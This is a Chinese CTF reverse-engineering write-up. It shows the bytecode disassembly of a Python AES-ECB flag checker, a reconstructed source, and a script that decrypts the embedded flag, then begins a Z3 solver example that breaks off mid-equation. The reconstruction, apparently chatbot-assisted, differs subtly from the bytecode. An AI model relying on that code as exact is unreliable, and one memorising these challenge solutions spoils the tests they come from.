href="https://blog.csdn.net/weixin_42495210/article/details/140088389?ops_request_misc=%257B%2522request%255Fid%2522%253A%252296B93773-09C2-4AAD-B9A4-DA0BAEEC6B78%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=96B93773-09C2-4AAD-B9A4-DA0BAEEC6B78&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-140088389-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=pycdc%20%E5%8F%8D%E7%BC%96%E8%AF%91%E4%B8%8D%E5%AE%8C%E6%95%B4&spm=1018.2226.3001.4187">上饶ctf 逆向 pvm.exe_pycdc.exe 反编译不了全部代码-CSDN博客</a></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><code class="hljs plain">File Name: PyPro.py<br>    Object Name: &lt;module&gt;<br>    Qualified Name: &lt;module&gt;<br>    Arg Count: 0<br>    Pos Only Arg Count: 0<br>    KW Only Arg Count: 0<br>    Stack Size: 2<br>    Flags: 0x00000000<br>    [Names]<br>        &#x27;base64&#x27;<br>        &#x27;Crypto.Cipher&#x27;<br>        &#x27;AES&#x27;<br>        &#x27;Crypto.Util.number&#x27;<br>        &#x27;long_to_bytes&#x27;<br>        &#x27;key&#x27;<br>        &#x27;PKCS5_pad&#x27;<br>        &#x27;main&#x27;<br>        &#x27;__name__&#x27;<br>    [Locals+Names]<br>    [Constants]<br>        0<br>        None<br>        (<br>            &#x27;AES&#x27;<br>        )<br>        (<br>            &#x27;long_to_bytes&#x27;<br>        )<br>        0x554B134A029DE539438BD18604BF114<br>        [Code]<br>            File Name: PyPro.py<br>            Object Name: PKCS5_pad<br>            Qualified Name: PKCS5_pad<br>            Arg Count: 1<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Stack Size: 5<br>            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)<br>            [Names]<br>                &#x27;len&#x27;<br>                &#x27;ljust&#x27;<br>                &#x27;to_bytes&#x27;<br>            [Locals+Names]<br>                &#x27;data&#x27;<br>                &#x27;length&#x27;<br>            [Constants]<br>                None<br>                48<br>            [Disassembly]<br>                0       RESUME                          0<br>                2       LOAD_GLOBAL                     1: NULL + len<br>                12      LOAD_FAST                       0: data<br>                14      CALL                            1<br>                22      LOAD_CONST                      1: 48<br>                24      COMPARE_OP                      2 (&lt;)<br>                28      POP_JUMP_IF_FALSE               46 (to 122)<br>                30      LOAD_CONST                      1: 48<br>                32      LOAD_GLOBAL                     1: NULL + len<br>                42      LOAD_FAST                       0: data<br>                44      CALL                            1<br>                52      BINARY_OP                       10 (-)<br>                56      STORE_FAST                      1: length<br>                58      LOAD_FAST                       0: data<br>                60      LOAD_ATTR                       3: ljust<br>                80      LOAD_CONST                      1: 48<br>                82      LOAD_FAST                       1: length<br>                84      LOAD_ATTR                       5: to_bytes<br>                104     CALL                            0<br>                112     CALL                            2<br>                120     RETURN_VALUE                    <br>                122     RETURN_CONST                    0: None<br>        [Code]<br>            File Name: PyPro.py<br>            Object Name: main<br>            Qualified Name: main<br>            Arg Count: 0<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Stack Size: 5<br>            Flags: 0x00000003 (CO_OPTIMIZED | CO_NEWLOCALS)<br>            [Names]<br>                &#x27;input&#x27;<br>                &#x27;encode&#x27;<br>                &#x27;len&#x27;<br>                &#x27;print&#x27;<br>                &#x27;range&#x27;<br>                &#x27;exit&#x27;<br>                &#x27;ord&#x27;<br>                &#x27;AES&#x27;<br>                &#x27;new&#x27;<br>                &#x27;long_to_bytes&#x27;<br>                &#x27;key&#x27;<br>                &#x27;MODE_ECB&#x27;<br>                &#x27;encrypt&#x27;<br>                &#x27;PKCS5_pad&#x27;<br>                &#x27;base64&#x27;<br>                &#x27;b64encode&#x27;<br>                &#x27;decode&#x27;<br>            [Locals+Names]<br>                &#x27;enc&#x27;<br>                &#x27;i&#x27;<br>                &#x27;chiper&#x27;<br>                &#x27;result&#x27;<br>                &#x27;data&#x27;<br>            [Constants]<br>                None<br>                &#x27;在这里输入你的flag:\n&#x27;<br>                &#x27;utf-8&#x27;<br>                44<br>                &#x27;length error!&#x27;<br>                123<br>                6<br>                &#x27;&#123;&#x27;<br>                -1<br>                &#x27;&#125;&#x27;<br>                &#x27;format error&#x27;<br>                1<br>                &#x27;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&#x27;<br>                &#x27;flag正确&#x27;<br>                &#x27;错误&#x27;<br>            [Disassembly]<br>                0       RESUME                          0<br>                2       LOAD_GLOBAL                     1: NULL + input<br>                12      LOAD_CONST                      1: &#x27;在这里输入你的flag:\n&#x27;<br>                14      CALL                            1<br>                22      LOAD_ATTR                       3: encode<br>                42      LOAD_CONST                      2: &#x27;utf-8&#x27;<br>                44      CALL                            1<br>                52      STORE_FAST                      0: enc<br>                54      LOAD_GLOBAL                     5: NULL + len<br>                64      LOAD_FAST                       0: enc<br>                66      CALL                            1<br>                74      LOAD_CONST                      3: 44<br>                76      COMPARE_OP                      55 (!=)<br>                80      POP_JUMP_IF_FALSE               48 (to 178)<br>                82      LOAD_GLOBAL                     7: NULL + print<br>                92      LOAD_CONST                      4: &#x27;length error!&#x27;<br>                94      CALL                            1<br>                102     POP_TOP                         <br>                104     LOAD_GLOBAL                     9: NULL + range<br>                114     LOAD_GLOBAL                     5: NULL + len<br>                124     LOAD_FAST                       0: enc<br>                126     CALL                            1<br>                134     CALL                            1<br>                142     GET_ITER                        <br>                144     FOR_ITER                        2 (to 150)<br>                148     STORE_FAST                      1: i<br>                150     JUMP_BACKWARD                   4 (to 144)<br>                152     END_FOR                         <br>                154     LOAD_GLOBAL                     11: NULL + exit<br>                164     LOAD_CONST                      5: 123<br>                166     CALL                            1<br>                174     POP_TOP                         <br>                176     JUMP_FORWARD                    57 (to 292)<br>                178     LOAD_FAST                       0: enc<br>                180     LOAD_CONST                      6: 6<br>                182     BINARY_SUBSCR                   <br>                186     LOAD_GLOBAL                     13: NULL + ord<br>                196     LOAD_CONST                      7: &#x27;&#123;&#x27;<br>                198     CALL                            1<br>                206     COMPARE_OP                      55 (!=)<br>                210     POP_JUMP_IF_TRUE                17 (to 246)<br>                212     LOAD_FAST                       0: enc<br>                214     LOAD_CONST                      8: -1<br>                216     BINARY_SUBSCR                   <br>                220     LOAD_GLOBAL                     13: NULL + ord<br>                230     LOAD_CONST                      9: &#x27;&#125;&#x27;<br>                232     CALL                            1<br>                240     COMPARE_OP                      55 (!=)<br>                244     POP_JUMP_IF_FALSE               23 (to 292)<br>                246     LOAD_GLOBAL                     7: NULL + print<br>                256     LOAD_CONST                      10: &#x27;format error&#x27;<br>                258     CALL                            1<br>                266     POP_TOP                         <br>                268     LOAD_GLOBAL                     11: NULL + exit<br>                278     LOAD_CONST                      11: 1<br>                280     CALL                            1<br>                288     POP_TOP                         <br>                290     NOP                             <br>                292     LOAD_GLOBAL                     15: NULL + AES<br>                302     LOAD_ATTR                       16: new<br>                322     LOAD_GLOBAL                     19: NULL + long_to_bytes<br>                332     LOAD_GLOBAL                     20: key<br>                342     CALL                            1<br>                350     LOAD_GLOBAL                     14: AES<br>                360     LOAD_ATTR                       22: MODE_ECB<br>                380     CALL                            2<br>                388     STORE_FAST                      2: chiper<br>                390     LOAD_FAST                       2: chiper<br>                392     LOAD_ATTR                       25: encrypt<br>                412     LOAD_GLOBAL                     27: NULL + PKCS5_pad<br>                422     LOAD_FAST                       0: enc<br>                424     CALL                            1<br>                432     CALL                            1<br>                440     STORE_FAST                      0: enc<br>                442     LOAD_GLOBAL                     29: NULL + base64<br>                452     LOAD_ATTR                       30: b64encode<br>                472     LOAD_FAST                       0: enc<br>                474     CALL                            1<br>                482     STORE_FAST                      3: result<br>                484     LOAD_CONST                      12: &#x27;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&#x27;<br>                486     STORE_FAST                      4: data<br>                488     LOAD_FAST                       3: result<br>                490     LOAD_ATTR                       33: decode<br>                510     CALL                            0<br>                518     LOAD_FAST                       4: data<br>                520     COMPARE_OP                      40 (==)<br>                524     POP_JUMP_IF_FALSE               12 (to 550)<br>                526     LOAD_GLOBAL                     7: NULL + print<br>                536     LOAD_CONST                      13: &#x27;flag正确&#x27;<br>                538     CALL                            1<br>                546     POP_TOP                         <br>                548     RETURN_CONST                    0: None<br>                550     LOAD_GLOBAL                     7: NULL + print<br>                560     LOAD_CONST                      14: &#x27;错误&#x27;<br>                562     CALL                            1<br>                570     POP_TOP                         <br>                572     RETURN_CONST                    0: None<br>        &#x27;__main__&#x27;<br>    [Disassembly]<br>        0       RESUME                          0<br>        2       LOAD_CONST                      0: 0<br>        4       LOAD_CONST                      1: None<br>        6       IMPORT_NAME                     0: base64<br>        8       STORE_NAME                      0: base64<br>        10      LOAD_CONST                      0: 0<br>        12      LOAD_CONST                      2: (&#x27;AES&#x27;,)<br>        14      IMPORT_NAME                     1: Crypto.Cipher<br>        16      IMPORT_FROM                     2: AES<br>        18      STORE_NAME                      2: AES<br>        20      POP_TOP                         <br>        22      LOAD_CONST                      0: 0<br>        24      LOAD_CONST                      3: (&#x27;long_to_bytes&#x27;,)<br>        26      IMPORT_NAME                     3: Crypto.Util.number<br>        28      IMPORT_FROM                     4: long_to_bytes<br>        30      STORE_NAME                      4: long_to_bytes<br>        32      POP_TOP                         <br>        34      LOAD_CONST                      4: 0x554B134A029DE539438BD18604BF114<br>        36      STORE_NAME                      5: key<br>        38      LOAD_CONST                      5: &lt;CODE&gt; PKCS5_pad<br>        40      MAKE_FUNCTION                   0<br>        42      STORE_NAME                      6: PKCS5_pad<br>        44      LOAD_CONST                      6: &lt;CODE&gt; main<br>        46      MAKE_FUNCTION                   0<br>        48      STORE_NAME                      7: main<br>        50      LOAD_NAME                       8: __name__<br>        52      LOAD_CONST                      7: &#x27;__main__&#x27;<br>        54      COMPARE_OP                      40 (==)<br>        58      POP_JUMP_IF_FALSE               8 (to 76)<br>        60      PUSH_NULL                       <br>        62      LOAD_NAME                       7: main<br>        64      CALL                            0<br>        72      POP_TOP                         <br>        74      RETURN_CONST                    1: None<br>        76      RETURN_CONST                    1: None<br></code></pre></td></tr></table></figure><p>拿出所有字节码看看，看到数据了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs plain">根据以上的详细字节码反编译信息，我们可以还原并分析Python代码的逻辑。以下是逐步的还原代码和各部分的解释：<br><br>```python<br>import base64<br>from Crypto.Cipher import AES<br>from Crypto.Util.number import long_to_bytes<br><br># 定义AES的密钥，用于对输入的数据进行加密<br>key = 0x554B134A029DE539438BD18604BF114<br><br># PKCS5填充函数，用于确保数据长度是AES块大小的倍数（48字节）<br>def PKCS5_pad(data):<br>    if len(data) &lt; 48:<br>        length = 48 - len(data)<br>        # 将数据填充到48字节<br>        return data + bytes([length] * length)  <br>    return data<br><br>def main():<br>    # 获取用户输入的flag并编码成utf-8格式<br>    enc = input(&#x27;在这里输入你的flag:\n&#x27;).encode(&#x27;utf-8&#x27;)<br><br>    # 检查输入的长度是否为44字节<br>    if len(enc) != 44:<br>        print(&#x27;length error!&#x27;)<br>        for i in range(len(enc)):<br>            pass  # 此处的循环没有实际操作<br>        exit(123)  # 长度错误时退出<br><br>    # 确保flag以特定的字符&#x27;&#123;&#x27;开头和&#x27;&#125;&#x27;结尾<br>    if ord(enc[6]) != ord(&#x27;&#123;&#x27;) or ord(enc[-1]) != ord(&#x27;&#125;&#x27;):<br>        print(&#x27;format error&#x27;)<br>        exit(1)  # 格式错误时退出<br><br>    # 创建AES加密对象，使用ECB模式（Electronic Codebook）<br>    cipher = AES.new(long_to_bytes(key, 16), AES.MODE_ECB)<br>    <br>    # 对输入进行PKCS5填充并加密<br>    encrypted = cipher.encrypt(PKCS5_pad(enc))<br>    <br>    # 将加密结果进行Base64编码<br>    result = base64.b64encode(encrypted)<br>    <br>    # 预定义的加密验证数据<br>    expected_data = &#x27;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&#x27;<br><br>    # 将结果解码为字符串并与预期数据进行比较<br>    if result.decode() == expected_data:<br>        print(&#x27;flag正确&#x27;)<br>    else:<br>        print(&#x27;错误&#x27;)<br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="分析说明"><a href="#分析说明" class="headerlink" title="分析说明"></a>分析说明</h3><ol><li><strong>密钥</strong>：<code>key</code>是一个16字节的AES密钥，以十六进制表示，并在程序中使用。</li><li><strong>PKCS5填充</strong>：<code>PKCS5_pad</code>函数确保数据的长度达到48字节，填充方式是将缺少的字节用填充值填充。</li><li><strong>输入验证</strong>：<ul><li>输入的<code>flag</code>必须为44字节长度，不符合长度则直接报错退出。</li><li>验证<code>flag</code>的第7个字符为<code>&#39;&#123;&#39;</code>，且最后一个字符为<code>&#39;&#125;&#39;</code>，否则退出并提示格式错误。</li></ul></li><li><strong>AES加密</strong>：<ul><li>使用AES ECB模式加密填充后的数据，最终生成密文。</li></ul></li><li><strong>Base64编码和比较</strong>：<ul><li>对密文进行Base64编码，将编码结果与预期的字符串<code>expected_data</code>进行比较。</li><li>如果匹配，输出“flag正确”；否则输出“错误”。</li></ul></li></ol><h3 id="字节码中的细节"><a href="#字节码中的细节" class="headerlink" title="字节码中的细节"></a>字节码中的细节</h3><ul><li>反编译时的<code>JUMP_BACKWARD</code>和其他字节码指令实现了长度和格式的验证逻辑，以及字符位置的条件检查。</li><li>出现的部分冗余指令可以忽略，因为它们不影响核心逻辑的理解和执行。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>来点chat<br><br>```plain<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-comment"># 定义AES的密钥</span><br>key = <span class="hljs-number">0x554B134A029DE539438BD18604BF114</span><br><br><br><span class="hljs-comment"># PKCS5填充去填充函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">PKCS5_unpad</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment"># 获取最后一个字节的值，它表示填充的字节数</span><br>    padding_length = data[-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">return</span> data[:-padding_length]  <span class="hljs-comment"># 返回去掉填充的内容</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">enc_data</span>):<br>    <span class="hljs-comment"># 对Base64编码的数据进行解码</span><br>    encrypted_data = base64.b64decode(enc_data)<br><br>    <span class="hljs-comment"># 创建AES解密对象，使用ECB模式</span><br>    cipher = AES.new(long_to_bytes(key, <span class="hljs-number">16</span>), AES.MODE_ECB)<br><br>    <span class="hljs-comment"># 解密数据</span><br>    decrypted_data = cipher.decrypt(encrypted_data)<br><br>    <span class="hljs-comment"># 去掉PKCS5填充</span><br>    <span class="hljs-keyword">return</span> PKCS5_unpad(decrypted_data)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 这里替换为需要解密的Base64字符串</span><br>    encrypted_flag = <span class="hljs-string">&#x27;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&#x27;</span><br><br>    <span class="hljs-comment"># 调用解密函数</span><br>    decrypted_flag = decrypt(encrypted_flag)<br><br>    <span class="hljs-comment"># 输出解密结果</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;解密后的flag:&#x27;</span>, decrypted_flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/./img/od0FslMaB1SW7IBB/1730209896862-3adfe5c5-9adc-4573-a4a0-35c41e8e980d-736318.png" alt="1730209896862-3adfe5c5-9adc-4573-a4a0-35c41e8e980d.png"></p><h2 id="MineSweeper"><a href="#MineSweeper" class="headerlink" title="MineSweeper"></a>MineSweeper</h2><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="caeser"><a href="#caeser" class="headerlink" title="caeser"></a>caeser</h2><p>直接爆破</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p><img src="/./img/od0FslMaB1SW7IBB/1728374713484-2a33a21a-52b5-4f46-882e-c813467a6602-342719.png" alt="1728374713484-2a33a21a-52b5-4f46-882e-c813467a6602.png"></p><blockquote><p>更新: 2024-11-02 13:07:28<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/pg6oz3fgpna64x2b">https://www.yuque.com/chaye-apqbl/vsc85q/pg6oz3fgpna64x2b</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/Z3%E9%80%86%E5%90%91%EF%BC%88%E8%A7%A3%E6%96%B9%E7%A8%8B%EF%BC%89/"/>
    <url>/2026/01/19/RE/%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91/Z3%E9%80%86%E5%90%91%EF%BC%88%E8%A7%A3%E6%96%B9%E7%A8%8B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Z3逆向（解方程）"><a href="#Z3逆向（解方程）" class="headerlink" title="Z3逆向（解方程）"></a>Z3逆向（解方程）</h1><h1 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h1><p><a href="https://www.freebuf.com/articles/web/232002.html">https://www.freebuf.com/articles/web/232002.html</a></p><p>注意：不能建立任何z3同名的文件，不然import导入的是z3文件而不是z3模块</p><p>因为这个问题一直以为自己电脑用不了z3了，甚至决定放弃这块，现在想想真是可笑（顺便夸一下万能ai）</p><p><font style="color:#DF2A3F;">#v &#x3D; [Int(f’v{i}’)    for i in range(0, 16)] 自定义</font></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、login"><a href="#1、login" class="headerlink" title="1、login"></a>1、login</h2><p><img src="/./img/49277317_OcNrDgdRnL7OC6p2/1721790096751-21fcbb1c-4754-4223-8446-6f575e67948a-080979.png" alt="1721790096751-21fcbb1c-4754-4223-8446-6f575e67948a.png"></p><p>先进行正常的py逆向，得到python文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python<br># visit https://tool.lu/pyc/ for more information<br># Version: Python 3.6<br><br>import sys<br>input1 = input(&#x27;input something:&#x27;)<br>if len(input1) != 14:<br>    print(&#x27;Wrong length!&#x27;)<br>    sys.exit()<br>code = []<br>for i in range(13):<br>    code.append(ord(input1[i]) ^ ord(input1[i + 1]))<br><br>code.append(ord(input1[13]))<br>a1 = code[2]<br>a2 = code[1]<br>a3 = code[0]<br>a4 = code[3]<br>a5 = code[4]<br>a6 = code[5]<br>a7 = code[6]<br>a8 = code[7]<br>a9 = code[9]<br>a10 = code[8]<br>a11 = code[10]<br>a12 = code[11]<br>a13 = code[12]<br>a14 = code[13]<br>if ((((a1 * 88 + a2 * 67 + a3 * 65 - a4 * 5) + a5 * 43 + a6 * 89 + a7 * 25 + a8 * 13 - a9 * 36) + a10 * 15 + a11 * 11 + a12 * 47 - a13 * 60) + a14 * 29 == 22748) &amp; ((((a1 * 89 + a2 * 7 + a3 * 12 - a4 * 25) + a5 * 41 + a6 * 23 + a7 * 20 - a8 * 66) + a9 * 31 + a10 * 8 + a11 * 2 - a12 * 41 - a13 * 39) + a14 * 17 == 7258) &amp; ((((a1 * 28 + a2 * 35 + a3 * 16 - a4 * 65) + a5 * 53 + a6 * 39 + a7 * 27 + a8 * 15 - a9 * 33) + a10 * 13 + a11 * 101 + a12 * 90 - a13 * 34) + a14 * 23 == 26190) &amp; ((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) &amp; (((a1 * 38 + a2 * 97 + a3 * 35 - a4 * 52) + a5 * 42 + a6 * 79 + a7 * 90 + a8 * 23 - a9 * 36) + a10 * 57 + a11 * 81 + a12 * 42 - a13 * 62 - a14 * 11 == 27915) &amp; ((((a1 * 22 + a2 * 27 + a3 * 35 - a4 * 45) + a5 * 47 + a6 * 49 + a7 * 29 + a8 * 18 - a9 * 26) + a10 * 35 + a11 * 41 + a12 * 40 - a13 * 61) + a14 * 28 == 17298) &amp; ((((a1 * 12 + a2 * 45 + a3 * 35 - a4 * 9 - a5 * 42) + a6 * 86 + a7 * 23 + a8 * 85 - a9 * 47) + a10 * 34 + a11 * 76 + a12 * 43 - a13 * 44) + a14 * 65 == 19875) &amp; (((a1 * 79 + a2 * 62 + a3 * 35 - a4 * 85) + a5 * 33 + a6 * 79 + a7 * 86 + a8 * 14 - a9 * 30) + a10 * 25 + a11 * 11 + a12 * 57 - a13 